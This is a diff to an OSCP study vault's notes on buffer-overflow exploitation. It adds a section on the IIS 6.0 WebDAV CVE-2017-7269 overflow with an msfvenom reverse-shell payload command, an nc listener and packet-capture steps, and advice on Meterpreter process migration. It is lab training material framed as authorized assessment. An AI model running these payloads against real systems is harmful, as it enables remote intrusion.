@@ -87,7 +87,7 @@ chr(0x90) and pack("V", 0x68A842B5), and send it to 127.0.0.1:8888 with
 fsockopen. This separates a correct overflow from a blocked PowerShell or
 dropped-executable wrapper.
 
-See [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] and
+See [[OSCP/RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] and
 [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].
 
 #### Tags: #CloudMe #EDB48389 #StackOverflow #X86 #PUSHESP #ShellcodeDelivery
@@ -113,6 +113,43 @@ Keep the full source and proof values in private loot. The shared write-up shoul
 
 #### Tags: #SUID #AdjacentStringOverwrite #ELF #Gets #Execve #LinuxPrivesc #Covfefe
 
+---
+
+## IIS 6.0 WebDAV: Unicode blobs, alpha-mixed payloads, and process lifetime
+
+For the CVE-2017-7269 `ScStoragePathFromUrl` overflow, the public PoC carries two large Unicode-encoded overflow blobs. Keep an untouched source copy and compare parsed bytes after porting the request code to Python 3:
+
+```bash
+cp "$BoxDir/exploits/41738.py" "$BoxDir/exploits/41738.original.py"
+python3 -m py_compile "$BoxDir/exploits/41738-adapted.py"
+sha256sum "$BoxDir/exploits/41738.py" "$BoxDir/exploits/41738-adapted.py"
+```
+
+Generate a payload that matches the delivery constraints:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST="$LocalIP" LPORT="$Port" EXITFUNC=thread \
+  -e x86/alpha_mixed BufferRegister=EAX -f python
+```
+
+`x86/alpha_mixed` keeps the decoded payload within the alphanumeric constraints expected by the public exploit, while `BufferRegister=EAX` identifies the decoder's payload register. `EXITFUNC=thread` controls shellcode cleanup only; it cannot make the socket survive termination of the IIS worker process hosting the thread.
+
+Pair the listener with packet capture:
+
+```bash
+sudo tcpdump -ni tun0 -n "host $BoxIP and tcp port $Port" -w "$BoxDir/loot/webdav-callback.pcap"
+nc -lvnp "$Port"
+```
+
+A delayed HTTP 500 without a SYN proves neither a callback nor a simple egress block. A bind-payload reset is useful corroboration that the socket died with `w3wp.exe`. Repeated crashes may trip IIS Rapid Fail Protection and change later requests to immediate RSTs.
+
+The stable route uses staged Meterpreter and immediate migration to a long-lived process before the IIS worker dies. This is a process-lifetime issue, not a replacement for source review.
+
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]].
+
+#### Tags: #IIS6 #WebDAV #CVE20177269 #UnicodeOverflow #AlphaMixed #ProcessMigration #RapidFailProtection
+
 ## **Outstanding**
 This area grows alongside the module. A genuine from-scratch offset/bad-char/return-address discovery workflow (local debugger + mona.py) is the obvious next addition once a BOF box actually requires deriving these rather than reusing a public exploit's own research.
 ## External Resources
@@ -134,3 +171,5 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- demonstrates a source-derived adjacent-string overwrite in a SUID ELF
+- [[OSCP/BOXES/WRITE UPS/Linux/Dawn2|Dawn2]] -- demonstrates offset discovery, EIP control, gadget selection, and two null-terminated x86 overflows under Wine
+- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- demonstrates a reviewed AChat UDP overflow with Unicode-safe shellcode and a patched Python PoC
